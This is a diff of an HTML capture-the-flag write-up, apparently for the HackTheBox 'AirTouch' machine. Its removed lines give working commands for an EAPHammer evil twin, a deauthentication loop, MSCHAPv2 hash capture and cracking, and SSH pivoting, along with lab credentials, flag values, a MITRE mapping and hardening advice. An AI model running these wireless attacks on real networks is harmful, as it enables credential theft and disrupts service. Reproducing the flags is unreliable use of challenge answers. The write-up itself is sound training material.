-<span class="highlight">AC:8B:A9:AA:3F:D2</span>, ch <span class="success">44</span>, WPA2, CCMP, <span class="success">MGT</span>, AirTouch-Office
-<span class="highlight">AC:8B:A9:F3:A1:13</span>, ch <span class="success">44</span>, WPA2, CCMP, <span class="success">MGT</span>, AirTouch-Office
+    </div>
 
-<span class="comment"># Clientes buscando AirTouch-Office (not associated = sin AP disponible válido)</span>
-28:6C:07:12:EE:A1, (not associated), AirTouch-Office
-C8:8A:9A:6F:F9:D2, (not associated), AccessLink, AirTouch-Office
-          </div>
-        </div>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Fase 6 — Root Flag (Servidor 10.10.10.1)</h2></div>
+      
 
-        <div class="code-block">
-          <div class="code-label">💻 <span>Paso 2 — Parchear EAPHammer + importar certs</span></div>
-          <div class="code-body">
-<span class="comment"># Parchear todos los input() interactivos para ejecución en background</span>
-<span class="cmd">grep</span> <span class="param">-n</span> "input.*Press enter" /root/eaphammer/eaphammer
-<span class="comment"># 161:    input('\n\nPress enter to quit...\n\n')  &lt;-- crash con EOFError</span>
+    </div>
 
-<span class="cmd">sed</span> <span class="param">-i</span> "s/input.*Press enter to quit.*/import time; time.sleep(3600)/" \
-    /root/eaphammer/eaphammer
-<span class="comment"># Verificar: ahora línea 161 dice: import time; time.sleep(3600)</span>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Credenciales Obtenidas</h2></div>
+      
 
-<span class="comment"># Verificar que los certs de AirTouch están importados en EAPHammer</span>
-<span class="cmd">ls</span> <span class="path">/root/eaphammer/certs/active/</span>
-<span class="comment"># fullchain.pem  &lt;-- contiene server.crt + ca.crt + server.key concatenados</span>
-          </div>
-        </div>
+    </div>
 
-        <div class="code-block">
-          <div class="code-label">💻 <span>Paso 3 — Lanzar Evil Twin en wlan6, canal 44, BSSID único</span></div>
-          <div class="code-body">
-<span class="comment"># Asegurar wlan6 en modo managed (limpio)</span>
-<span class="cmd">iw dev</span> wlan6 info
-<span class="comment"># Interface wlan6  addr 02:00:00:00:06:00  type managed  wiphy 6</span>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Mapeo MITRE ATT&CK</h2></div>
+      
 
-cd /root/eaphammer
-<span class="comment"># --creds: modo captura de credenciales EAP (WPE patch en hostapd)</span>
-<span class="comment"># Sin -b: EAPHammer asigna su propio BSSID 00:11:22:33:44:00 (único, sin colisión)</span>
-<span class="cmd">nohup python3 eaphammer</span> <span class="param">--creds</span> \
-  <span class="param">-i</span> wlan6 \
-  <span class="param">-e</span> "AirTouch-Office" \
-  <span class="param">-c</span> 44 \
-  <span class="param">--auth</span> wpa-eap \
-  > /tmp/eaphammer_wlan6.log 2>&1 &
+    </div>
 
-<span class="comment"># Verificar que el AP arrancó correctamente</span>
-<span class="cmd">tail</span> /tmp/eaphammer_wlan6.log
-<span class="success"># Using interface wlan6 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Office"</span>
-<span class="success"># wlan6: AP-ENABLED</span>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Lecciones Aprendidas y Recomendaciones</h2></div>
+      
 
-<span class="comment"># Verificar con iw dev</span>
-<span class="cmd">iw dev</span> wlan6 info
-<span class="success"># ssid AirTouch-Office  type AP  channel 44 (5220 MHz)</span>
-          </div>
-        </div>
+    </div>
 
-        <div class="code-block">
-          <div class="code-label">💻 <span>Paso 4 — Deauth continuo para forzar reconexión al Evil Twin</span></div>
-          <div class="code-body">
-<span class="comment"># Colocar wlan4mon en canal 44 para poder inyectar en la misma frecuencia</span>
-<span class="cmd">iw dev</span> wlan4mon <span class="cmd">set channel</span> 44
-<span class="cmd">iw dev</span> wlan4mon info
-<span class="success"># channel 44 (5220 MHz)  type monitor</span>
+  </div>
 
-<span class="comment"># Loop de deauth contra AMBOS APs reales (broadcast: todos los clientes conectados)</span>
-while true; do
-  <span class="cmd">aireplay-ng</span> <span class="param">--ignore-negative-one -0 5</span> \
-              <span class="param">-a</span> <span class="ip">AC:8B:A9:AA:3F:D2</span> wlan4mon 2>/dev/null
-  <span class="cmd">aireplay-ng</span> <span class="param">--ignore-negative-one -0 5</span> \
-              <span class="param">-a</span> <span class="ip">AC:8B:A9:F3:A1:13</span> wlan4mon 2>/dev/null
-  sleep 2
-done > /tmp/deauth_loop.log 2>&1 &
-<span class="comment"># Deauth PID: 26481</span>
-
-<span class="comment"># Verificar que los deauths se envían</span>
-<span class="cmd">tail</span> /tmp/deauth_loop.log
-<span class="comment"># Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]</span>
-<span class="comment"># Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span>
-          </div>
-        </div>
-
-        <div class="code-block">
-          <div class="code-label">🎯 <span>Paso 5 — Hash MSCHAPv2 Capturado (~30 segundos)</span></div>
-          <div class="code-body">
-<span class="comment"># Monitorear en tiempo real</span>
-<span class="cmd">tail -f</span> /tmp/eaphammer_wlan6.log
-
-<span class="comment"># Primero vemos la asociación del cliente:</span>
-wlan6: STA <span class="ip">c8:8a:9a:6f:f9:d2</span> IEEE 802.11: associated (aid 1)
-wlan6: CTRL-EVENT-EAP-STARTED <span class="ip">c8:8a:9a:6f:f9:d2</span>
-wlan6: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1    <span class="comment">&lt;-- EAP-Identity</span>
-wlan6: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25   <span class="comment">&lt;-- PEAP negociado!</span>
-
-<span class="comment"># El hash aparece en el log de EAPHammer WPE:</span>
-<span class="cmd">cat</span> /root/eaphammer/logs/hostapd-eaphammer.log
-
-mschapv2: Mon Mar  9 19:23:04 2026
-     domain\username:   AirTouch\<span class="user">r4ulcl</span>
-     username:          <span class="user">r4ulcl</span>
-     challenge:         <span class="highlight">67:79:78:7f:11:b0:78:4b</span>
-     response:          <span class="highlight">b6:b4:ee:9e:1f:32:e1:74:a3:c5:13:29:6d:ea:21:fc:d0:67:62:8e:2c:3b:b2:d7</span>
-
-     jtr NETNTLM:       <span class="success">r4ulcl:$NETNTLM$6779787f11b0784b$b6b4ee9e1f32e174a3c513296dea21fcd067628e2c3bb2d7</span>
-     hashcat NETNTLM:   <span class="success">r4ulcl::::b6b4ee9e1f32e174a3c513296dea21fcd067628e2c3bb2d7:6779787f11b0784b</span>
-          </div>
-        </div>
-
-        <div class="code-block">
-          <div class="code-label">💻 <span>Paso 6 — Crackeo del hash MSCHAPv2 con John</span></div>
-          <div class="code-body">
-<span class="comment"># Preparar hash en formato NETNTLM para John the Ripper</span>
-<span class="comment"># Formato: usuario:::challenge:response:challenge</span>
-<span class="cmd">echo</span> "r4ulcl:::6779787f11b0784b:b6b4ee9e1f32e174a3c513296dea21fcd067628e2c3bb2d7:6779787f11b0784b" \
-     > /tmp/john_netntlm.hash
-
-<span class="comment"># Crackear con John the Ripper (no requiere GPU/OpenCL)</span>
-<span class="cmd">john</span> <span class="param">--format=netntlm</span> \
-     <span class="param">--wordlist=</span><span class="path">/usr/share/wordlists/rockyou.txt</span> \
-     /tmp/john_netntlm.hash
-
-<span class="comment"># Loaded 1 password hash (netntlm, NTLMv1 C/R)</span>
-<span class="success"># laboratory       (r4ulcl)</span>
-<span class="comment"># 1g 0:00:00:00 DONE (2026-03-09 15:30) 7.14g/s 662400p/s</span>
-<span class="success"># CREDENCIALES EAP: AirTouch\r4ulcl : laboratory</span>
-          </div>
-        </div>
-      </section>
-
-      <!-- 7. Fase 6: Root -->
-      <section class="section" id="root">
-        <div class="section-header">
-          <div class="section-number">7</div>
-          <h2>Fase 6 — Root Flag (Servidor 10.10.10.1)</h2>
-        </div>
-
-        <div class="code-block">
-          <div class="code-label">💻 <span>Conexión a AirTouch-Office + Root Flag</span></div>
-          <div class="code-body">
-<span class="comment"># 1. Crear config wpa_supplicant con credenciales EAP crackeadas</span>
-<span class="cmd">cat</span> > /tmp/office.conf << 'EOF'
-ctrl_interface=/var/run/wpa_supplicant
-ap_scan=1
-network={
-  ssid="AirTouch-Office"
-  key_mgmt=WPA-EAP
-  eap=PEAP
-  identity="AirTouch\r4ulcl"
-  password="laboratory"
-  phase1="peapver=0"
-  phase2="auth=MSCHAPV2"
-}
-EOF
-
-<span class="comment"># 2. Conectar wlan3 a AirTouch-Office</span>
-<span class="cmd">wpa_supplicant</span> <span class="param">-B -i</span> wlan3 <span class="param">-c</span> /tmp/office.conf
-<span class="cmd">dhclient</span> wlan3
-<span class="success"># IP asignada: 10.10.10.10/24</span>
-
-<span class="comment"># 3. Túnel SSH desde Kali: Kali → consultant → 10.10.10.1</span>
-<span class="cmd">ssh</span> <span class="param">-f -N -L 2223:10.10.10.1:22</span> <span class="user">consultant</span>@<span class="ip">10.129.3.94</span>
-
-<span class="comment"># 4. SSH a servidor remoto como "remote"</span>
-<span class="cmd">sshpass -p</span> 'xGgWEwqUpfoOVsLeROeG' <span class="cmd">ssh</span> <span class="param">-p 2223</span> <span class="user">remote</span>@localhost
-
-<span class="comment"># 5. Leer hostapd WPE user file → credenciales admin</span>
-<span class="cmd">cat</span> <span class="path">/etc/hostapd/hostapd_wpe.eap_user</span>
-<span class="highlight"># "AirTouch\r4ulcl"  MSCHAPV2  "laboratory" [2]</span>
-<span class="highlight"># "admin"            MSCHAPV2  "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]</span>
-
-<span class="comment"># 6. SSH como admin → root</span>
-<span class="cmd">sshpass -p</span> 'xMJpzXt4D9ouMuL3JJsMriF7KZozm7' <span class="cmd">ssh</span> <span class="param">-p 2223</span> <span class="user">admin</span>@localhost
-<span class="cmd">sudo -i</span>
-<span class="cmd">cat</span> <span class="path">/root/root.txt</span>
-<span class="success"># 26eb68a0dfc87c159fa46b0e2350d4e7</span>
-          </div>
-        </div>
-
-        <!-- Flags -->
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:20px;">
-          <div class="flag-box">
-            <span class="flag-icon">🏳️</span>
-            <div>
-              <div class="flag-label">User Flag</div>
-              <div class="flag-value">3409777db07f2c8da0f3bdf40fcf0890</div>
-              <div class="flag-user">Router 192.168.3.1 → sudo -i → /root/usuario.txt</div>
-            </div>
-          </div>
-          <div class="flag-box">
-            <span class="flag-icon">🏴</span>
-            <div>
-              <div class="flag-label">Root Flag</div>
-              <div class="flag-value">26eb68a0dfc87c159fa46b0e2350d4e7</div>
-              <div class="flag-user">admin@10.10.10.1 → sudo -i → /root/root.txt</div>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      <!-- 8. Credenciales -->
-      <section class="section" id="credenciales">
-        <div class="section-header">
-          <div class="section-number">8</div>
-          <h2>Credenciales Obtenidas</h2>
-        </div>
-
-        <table class="creds-table">
-          <thead>
-            <tr>
-              <th>Servicio / Red</th>
-              <th>Usuario</th>
-              <th>Contraseña / Clave</th>
-              <th>Método</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><span class="badge badge-blue">SSH</span> 10.129.3.94</td>
-              <td><code>consultant</code></td>
-              <td><code>RxBlZhLmOkacNWScmZ6D</code></td>
-              <td>Proporcionado</td>
-            </tr>
-            <tr>
-              <td><span class="badge badge-cyan">WiFi</span> AirTouch-Internet</td>
-              <td>—</td>
-              <td><code>challenge</code></td>
-              <td>aircrack-ng + rockyou</td>
-            </tr>
-            <tr>
-              <td><span class="badge badge-orange">HTTP</span> Router 192.168.3.1</td>
-              <td><code>user</code></td>
-              <td><code>JunDRDZKHDnpkpDDvay</code></td>
-              <td>RCE en webshell → login.php</td>
-            </tr>
-            <tr>
-              <td><span class="badge badge-orange">HTTP</span> Router 192.168.3.1</td>
-              <td><code>manager</code></td>
-              <td><code>2wLFYNh4TSTgA5sNgT4</code></td>
-              <td>RCE en webshell → login.php</td>
-            </tr>
-            <tr>
-              <td><span class="badge badge-purple">SSH</span> Router 192.168.3.1</td>
-              <td><code>user</code></td>
-              <td><code>JunDRDZKHDnpkpDDvay</code></td>
-              <td>Túnel SSH via consultant</td>
-            </tr>
-            <tr>
-              <td><span class="badge badge-cyan">WiFi EAP</span> AirTouch-Office</td>
-              <td><code>AirTouch\r4ulcl</code></td>
-              <td><code>laboratory</code></td>
-              <td>Evil Twin + john netntlm</td>
-            </tr>
-            <tr>
-              <td><span class="badge badge-green">SSH</span> 10.10.10.1</td>
-              <td><code>remote</code></td>
-              <td><code>xGgWEwqUpfoOVsLeROeG</code></td>
-              <td>send_certs.sh en router</td>
-            </tr>
-            <tr>
-              <td><span class="badge badge-red">SSH ROOT</span> 10.10.10.1</td>
-              <td><code>admin</code></td>
-              <td><code>xMJpzXt4D9ouMuL3JJsMriF7KZozm7</code></td>
-              <td>hostapd_wpe.eap_user</td>
-            </tr>
-          </tbody>
-        </table>
-      </section>
-
-      <!-- 9. MITRE ATT&CK -->
-      <section class="section" id="mitre">
-        <div class="section-header">
-          <div class="section-number">9</div>
-          <h2>Mapeo MITRE ATT&CK</h2>
-        </div>
-
-        <table class="data-table">
-          <thead>
-            <tr>
-              <th>ID de Técnica</th>
-              <th>Nombre</th>
-              <th>Fase</th>
-              <th>Evidencia en AirTouch</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><code>T1040</code></td>
-              <td>Network Sniffing</td>
-              <td><span class="badge badge-blue">Reconocimiento</span></td>
-              <td>airodump-ng captura handshakes y tráfico en canal 6 y 44</td>
-            </tr>
-            <tr>
-              <td><code>T1110.001</code></td>
-              <td>Brute Force: Password Guessing</td>
-              <td><span class="badge badge-red">Acceso Inicial</span></td>
-              <td>aircrack-ng + rockyou contra handshake WPA2-PSK</td>
-            </tr>
-            <tr>
-              <td><code>T1557.002</code></td>
-              <td>ARP/WiFi Evil Twin (MitM)</td>
-              <td><span class="badge badge-red">Acceso Inicial</span></td>
-              <td>EAPHammer Evil Twin para AirTouch-Office en canal 44</td>
-            </tr>
-            <tr>
-              <td><code>T1539</code></td>
-              <td>Steal Web Session Cookie</td>
-              <td><span class="badge badge-orange">Credenciales</span></td>
-              <td>Extracción de PHPSESSID y UserRole=admin del tráfico descifrado</td>
-            </tr>
-            <tr>
-              <td><code>T1190</code></td>
-              <td>Exploit Public-Facing Application</td>
-              <td><span class="badge badge-red">Acceso Inicial</span></td>
-              <td>File upload sin restricción en PHP del router 192.168.3.1</td>
-            </tr>
-            <tr>
-              <td><code>T1059.004</code></td>
-              <td>Command and Scripting: Unix Shell</td>
-              <td><span class="badge badge-yellow">Ejecución</span></td>
-              <td>Webshell .phtml ejecuta comandos como www-data en el router</td>
-            </tr>
-            <tr>
-              <td><code>T1552.001</code></td>
-              <td>Credentials in Files</td>
-              <td><span class="badge badge-orange">Credenciales</span></td>
-              <td>Credenciales hardcodeadas en login.php y send_certs.sh</td>
-            </tr>
-            <tr>
-              <td><code>T1111</code></td>
-              <td>MFA Interception (MSCHAPv2)</td>
-              <td><span class="badge badge-orange">Credenciales</span></td>
-              <td>Captura y crackeo del challenge/response MSCHAPv2 de r4ulcl</td>
-            </tr>
-            <tr>
-              <td><code>T1021.004</code></td>
-              <td>Remote Services: SSH</td>
-              <td><span class="badge badge-purple">Movimiento Lateral</span></td>
-              <td>Túneles SSH encadenados: Kali → consultant → router → 10.10.10.1</td>
-            </tr>
-            <tr>
-              <td><code>T1078</code></td>
-              <td>Valid Accounts</td>
-              <td><span class="badge badge-purple">Persistencia</span></td>
-              <td>Uso de credenciales admin legítimas para acceso root a 10.10.10.1</td>
-            </tr>
-          </tbody>
-        </table>
-      </section>
-
-      <!-- 10. Lecciones Aprendidas -->
-      <section class="section" id="lecciones">
-        <div class="section-header">
-          <div class="section-number">10</div>
-          <h2>Lecciones Aprendidas y Recomendaciones</h2>
-        </div>
-
-        <div class="rec-grid">
-          <div class="rec-card">
-            <div class="rec-title">🔑 Usar WPA3 o WPA2 con PMF</div>
-            <div class="rec-body">WPA2-PSK es vulnerable a ataques de diccionario offline. Migrar a WPA3-SAE elimina esta superficie. Como mínimo, activar Protected Management Frames (PMF) para mitigar deauth attacks.</div>
-          </div>
-          <div class="rec-card">
-            <div class="rec-title">📜 Validación de certificados EAP en clientes</div>
-            <div class="rec-body">Los clientes deben validar el certificado del servidor EAP fijando la CA y el CN esperado en la configuración de wpa_supplicant. Sin esto, un Evil Twin con cualquier certificado firmado por la CA captura credenciales.</div>
-          </div>
-          <div class="rec-card">
-            <div class="rec-title">🔐 No almacenar credenciales en scripts</div>
-            <div class="rec-body">send_certs.sh contenía credenciales en texto plano. Usar variables de entorno, gestores de secretos (HashiCorp Vault, AWS Secrets Manager) o autenticación por clave SSH sin contraseña.</div>
-          </div>
-          <div class="rec-card">
-            <div class="rec-title">🌐 Sanitizar uploads de ficheros</div>
-            <div class="rec-body">El router permitía subir archivos .phtml ejecutables. Implementar validación estricta de extensión, almacenamiento fuera del docroot y cabeceras Content-Type validadas en servidor.</div>
-          </div>
-          <div class="rec-card">
-            <div class="rec-title">📡 Separación de redes WiFi</div>
-            <div class="rec-body">AirTouch-Internet y AirTouch-Office compartían infraestructura alcanzable desde la misma posición. La segmentación de red (VLAN, firewall L3) debe impedir que la comprometida de una WiFi alcance recursos de otra.</div>
-          </div>
-          <div class="rec-card">
-            <div class="rec-title">🔒 Contraseñas fuertes para EAP</div>
-            <div class="rec-body">"laboratory" aparece en rockyou.txt. Las contraseñas de cuentas EAP/RADIUS deben tener mínimo 16 caracteres aleatorios ya que los hashes MSCHAPv2 son atacables offline sin límite de intentos.</div>
-          </div>
-        </div>
-      </section>
-
-    </main>
-
-    <!-- SIDEBAR -->
-    <aside class="sidebar">
-
-      <!-- Info -->
-      <div class="sidebar-card">
-        <h4>📋 Información</h4>
-        <div class="detail-row">
-          <span class="detail-label">Máquina</span>
-          <span class="detail-value green">AirTouch</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">Plataforma</span>
-          <span class="detail-value">HackTheBox</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">Dificultad</span>
-          <span class="detail-value" style="color:var(--yellow)">Medium</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">Categoría</span>
-          <span class="detail-value">WiFi / Wireless</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">OS</span>
-          <span class="detail-value">Linux (Docker)</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">IP Objetivo</span>
-          <span class="detail-value green">10.129.3.94</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">IP Router</span>
-          <span class="detail-value">192.168.3.1</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">IP Remoto</span>
-          <span class="detail-value">10.10.10.1</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">Resuelta</span>
-          <span class="detail-value">09 Mar 2026</span>
-        </div>
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <h3>Detalles del Reto</h3>
+      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">MEDIUM</span></div>
+      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
+      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.X.X</span></div>
+      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Machine</span></div>
+      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">WPA2-PSK, Evil Twin</span></div>
+      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">—</span></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Skills Demostradas</h3>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">WiFi Hacking</span><span class="skill-pct">95%</span></div><div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">802.1X</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">Evil Twin</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">WPA2</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Herramientas</h3>
+      <div class="tools-list">
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">aircrack-ng</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">wireshark</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">hostapd</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">freeradius</span></div>
       </div>
-
-      <!-- Habilidades -->
-      <div class="sidebar-card">
-        <h4>📊 Habilidades Practicadas</h4>
-        <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">WiFi Attacking (WPA2)</span><span class="skill-pct">95%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
-        </div>
-        <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">EAP / Evil Twin (802.1X)</span><span class="skill-pct">90%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
-        </div>
-        <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">Packet Analysis / Decryption</span><span class="skill-pct">80%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:80%"></div></div>
-        </div>
-        <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">Web App Exploitation</span><span class="skill-pct">70%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:70%"></div></div>
-        </div>
-        <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">SSH Tunneling / Pivoting</span><span class="skill-pct">85%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
-        </div>
-        <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">Hash Cracking (MSCHAPv2)</span><span class="skill-pct">75%</span></div>
-          <div class="skill-bar"><div class="skill-fill" style="width:75%"></div></div>
-        </div>
-      </div>
-
-      <!-- Herramientas -->
-      <div class="sidebar-card">
-        <h4>🛠️ Herramientas Usadas</h4>
-        <div class="tool-list">
-          <div class="tool-item"><span class="tool-icon">📡</span> airodump-ng / aireplay-ng</div>
-          <div class="tool-item"><span class="tool-icon">🔓</span> aircrack-ng / airdecap-ng</div>
-          <div class="tool-item"><span class="tool-icon">👾</span> EAPHammer 1.14.0</div>
-          <div class="tool-item"><span class="tool-icon">🌐</span> wpa_supplicant / dhclient</div>
-          <div class="tool-item"><span class="tool-icon">🔍</span> nmap / snmp-check</div>
-          <div class="tool-item"><span class="tool-icon">💀</span> John the Ripper (netntlm)</div>
-          <div class="tool-item"><span class="tool-icon">🕸️</span> curl / Wireshark</div>
-          <div class="tool-item"><span class="tool-icon">🔌</span> SSH port forwarding</div>
-        </div>
-      </div>
-
-      <!-- ToC -->
-      <div class="sidebar-card">
-        <h4>📑 Contenido</h4>
-        <ul class="toc-list">
-          <li><a href="#descripcion">1. Descripción</a></li>
-          <li><a href="#reconocimiento">2. Reconocimiento</a></li>
-          <li><a href="#cadena">3. Cadena de Ataque</a></li>
-          <li><a href="#wpa2">4. WPA2 Handshake</a></li>
-          <li><a href="#router">5. Router + User Flag</a></li>
-          <li><a href="#eviltwin">6. Evil Twin EAP</a></li>
-          <li><a href="#root">7. Root Flag</a></li>
-          <li><a href="#credenciales">8. Credenciales</a></li>
-          <li><a href="#mitre">9. MITRE ATT&CK</a></li>
-          <li><a href="#lecciones">10. Lecciones</a></li>
-        </ul>
-      </div>
-
-      <!-- MITRE -->
-      <div class="sidebar-card">
-        <h4>🎯 MITRE Destacado</h4>
-        <div class="mitre-list">
-          <div class="mitre-item"><span class="mitre-id">T1110.001</span><span class="mitre-name">Brute Force: Password Guessing (WPA2-PSK)</span></div>
-          <div class="mitre-item"><span class="mitre-id">T1557.002</span><span class="mitre-name">WiFi Evil Twin / ARP Spoofing</span></div>
-          <div class="mitre-item"><span class="mitre-id">T1111</span><span class="mitre-name">MFA Interception — MSCHAPv2</span></div>
-          <div class="mitre-item"><span class="mitre-id">T1190</span><span class="mitre-name">Exploit Public-Facing Application</span></div>
-          <div class="mitre-item"><span class="mitre-id">T1021.004</span><span class="mitre-name">Remote Services: SSH Tunneling</span></div>
-        </div>
-      </div>
-
-    </aside>
+    </div>
   </div>
 </div>
 
-<footer>
-  <div class="footer-name">Yoandy Ramirez Delgado</div>
-  <div>
-    <a href="https://yoandy-portfolio.lovable.app">Portfolio</a>
-    <span class="footer-divider">|</span>
-    HackTheBox Machine: AirTouch
-    <span class="footer-divider">|</span>
-    Dificultad: Medium
-    <span class="footer-divider">|</span>
-    Resuelta: 09 Mar 2026
-  </div>
-</footer>
-
+<script>
+  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
+  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
+  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
+  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
+  setInterval(drawMatrix,35);
+</script>
 </body>
 </html>
